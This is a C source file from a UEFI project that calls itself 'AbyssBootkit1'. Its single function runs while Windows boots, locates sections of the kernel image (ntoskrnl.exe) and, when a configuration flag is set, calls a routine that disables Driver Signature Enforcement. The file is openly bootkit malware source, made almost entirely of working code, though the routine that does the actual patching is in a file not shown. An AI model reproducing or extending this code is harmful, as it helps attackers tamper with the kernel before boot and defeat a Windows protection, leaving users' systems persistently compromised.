// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Functions Patch/Hook Windows OS Kernel
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
#include <Library/UefiBootServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/BaseMemoryLib.h
// Provides copy memory, fill memory, zero memory, and GUID functions. The Base Memory Library provides optimized implementations for common memory-based operations. These functions should be used in place of coding your own loops to do equivalent common functions. This allows optimized library implementations to help increase performance.
#include <Library/BaseMemoryLib.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Functions/Functions00Configuration.h>
#include <Modules/Module0_PreBoot0_Configuration/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils00Debug.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils07PortableExecutable.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Protections/Protections01DriverSignatureEnforcement.h>



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module1_BootWindows0_Hookings/Structures/Structures01PortableExecutable.h>



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Patch to Windows Kernel (ntoskrnl.exe) image.
	@details        This function applies a custom patch to modify the behavior of the Windows Kernel.


	@param[in]      ImageBase                   A pointer to the base address of the loaded image.
	@param[in]      NtHeaders                   A pointer to the NT headers of the loaded image.


	@retval         EFI_SUCCESS                 The patch was successfully applied.
	@retval         other                       An error occurs during the patching process.
**/
EFI_STATUS
BootWindowsHookings_FunctionsWindowsKernel_PatchNtoskrnlExe(
	IN              VOID*                       ImageBase,
	IN              PEFI_IMAGE_NT_HEADERS       NtHeaders
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsKernel.c] (PatchNtoskrnlExe) - Hello\r\n");
	//BootWindowsHookings_UtilsDebug_AppendToEdgeBuffer(L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsKernel.c] (PatchNtoskrnlExe) - Hello\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	EFI_STATUS Status;
	UINT16 MajorVersion = 0, MinorVersion = 0, BuildNumber = 0, Revision = 0;
	UINT32 FileFlags = 0;


	// ---------------------------------------------------------------------------------------------------------------------
	// Get PE version info
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsKernel.c] (PatchNtoskrnlExe) - Get PE version info\r\n");

	Status = BootWindowsHookings_UtilsPortableExecutable_GetVersionPEFile(ImageBase, &MajorVersion, &MinorVersion, &BuildNumber, &Revision, &FileFlags);

	// Failed
	if (EFI_ERROR(Status))
	{
		return EFI_NOT_FOUND;
	}

	//BootWindowsHookings_UtilsDebug_AppendToEdgeBuffer(L"AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsKernel.c] (PatchNtoskrnlExe) - Print info Ntoskrnl.exe v%u.%u.%u.%u...\r\n", MajorVersion, MinorVersion, BuildNumber, Revision);


	// ---------------------------------------------------------------------------------------------------------------------
	// Find INIT, .text and PAGE sections
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsKernel.c] (PatchNtoskrnlExe) - Find INIT, .text and PAGE sections\r\n");

	PEFI_IMAGE_SECTION_HEADER InitSection = NULL, TextSection = NULL, PageSection = NULL;
	PEFI_IMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHeaders);
	for (UINT16 i = 0; i < NtHeaders->FileHeader.NumberOfSections; ++i)
	{
		CHAR8 SectionName[EFI_IMAGE_SIZEOF_SHORT_NAME + 1];

		// Copies a source buffer to a destination buffer, and returns the destination buffer.
		// https://uefi.org/specs/UEFI/2.11/07_Services_Boot_Services.html#efi-boot-services-copymem
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseMemoryLib/CopyMemWrapper.c#L41
		CopyMem(SectionName, Section->Name, EFI_IMAGE_SIZEOF_SHORT_NAME);
		SectionName[EFI_IMAGE_SIZEOF_SHORT_NAME] = '\0';

		// Compares two Null-terminated ASCII strings, and returns the difference between the first mismatched ASCII characters.
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L708
		if (AsciiStrCmp(SectionName, "INIT") == 0)
		{
			InitSection = Section;
		}
		// Compares two Null-terminated ASCII strings, and returns the difference between the first mismatched ASCII characters.
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L708
		else if (AsciiStrCmp(SectionName, ".text") == 0)
		{
			TextSection = Section;
		}
		// Compares two Null-terminated ASCII strings, and returns the difference between the first mismatched ASCII characters.
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L708
		else if (AsciiStrCmp(SectionName, "PAGE") == 0)
		{
			PageSection = Section;
		}

		Section++;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the DisableProtections field is TRUE
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsKernel.c] (PatchNtoskrnlExe) - Check if the DisableProtections field is TRUE\r\n");

	// Compares two Null-terminated Unicode strings, and returns the difference between the first mismatched Unicode characters.
	// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L109
	if (StrCmp(Global_PreBootConfiguration_FunctionsConfiguration_DisableProtections, L"TRUE") == 0)
	{
		// -----------------------------------------------------------------------------------------------------------------
		// Driver Signature Enforcement

		// Check if the DisableProtectionsDSE field is TRUE
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsKernel.c] (PatchNtoskrnlExe) - Check if the DisableProtectionsDSE field is TRUE\r\n");

		if (StrCmp(Global_PreBootConfiguration_FunctionsConfiguration_DisableProtectionsDSE, L"TRUE") == 0)
		{
			// -------------------------------------------------------------------------------------------------------------
			// Disable DSE
			//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsKernel.c] (PatchNtoskrnlExe) - Disable Driver Signature Enforcement\r\n");

			Status = Protections_DisableDriverSignatureEnforcement(ImageBase, NtHeaders, PageSection, BuildNumber);

			// Failed
			if (EFI_ERROR(Status))
			{
				//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELERROR, L"[ERROR] AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsKernel.c] (PatchNtoskrnlExe) - Protections_DisableDriverSignatureEnforcement failed.\r\n");

				return Status;
			}
		}
		else
		{
			//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELWARN, L"[WARN] AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsKernel.c] (PatchNtoskrnlExe) - StrCmp [Global_PreBootConfiguration_FunctionsConfiguration_DisableProtectionsDSE] not TRUE.\r\n");
		}

		// -----------------------------------------------------------------------------------------------------------------
		// Another Protections
	}
	else
	{
		//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELWARN, L"[WARN] AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsKernel.c] (PatchNtoskrnlExe) - StrCmp [Global_PreBootConfiguration_FunctionsConfiguration_DisableProtections] not TRUE.\r\n");
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	//PreBootConfiguration_UtilsDebug_DuringBootAndRuntimeAndHookingDebuggingAndOrPrintingAndOrLogging(MACRO_PREBOOTCONFIGURATION_UTILSDEBUG_LEVELINFO, L"[INFO] AbyssBootkit1 -> BootWindowsHookings [Functions/PatchHookWindowsKernel.c] (PatchNtoskrnlExe) - Bye\r\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
